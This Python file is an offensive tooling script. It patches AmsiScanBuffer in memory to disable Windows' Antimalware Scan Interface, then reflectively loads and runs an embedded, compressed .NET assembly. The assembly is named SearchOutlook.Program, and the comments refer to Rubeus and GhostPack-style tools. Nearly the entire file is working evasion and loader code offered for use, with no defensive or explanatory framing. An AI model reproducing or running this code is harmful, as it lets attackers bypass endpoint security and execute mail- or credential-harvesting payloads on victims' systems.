import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SearchOutlook.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()